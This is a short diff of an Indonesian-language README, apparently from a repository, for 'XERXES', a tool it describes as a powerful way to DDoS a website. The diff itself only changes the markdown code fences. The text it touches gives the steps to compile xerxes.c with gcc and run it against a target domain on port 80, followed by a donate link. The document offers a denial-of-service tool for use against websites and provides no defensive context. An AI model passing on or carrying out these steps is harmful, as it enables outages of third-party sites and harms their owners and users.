@@ -4,7 +4,7 @@
 
 ## xerxes
 XERXES DoS tool Yang Kuat untuk menDDOS suatu Website
-'''
+```
 # Cara Menggunakan :
 
 # $ pkg update && pkg upgrade
@@ -17,7 +17,7 @@ XERXES DoS tool Yang Kuat untuk menDDOS suatu Website
 # $ cd Xerxes
 # $ gcc xerxes.c -o xerxes
 # $ ./xerxes namaweb.com 80
-'''
+```
 <noscript><a href="https://liberapay.com/TheSploit/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
 
 
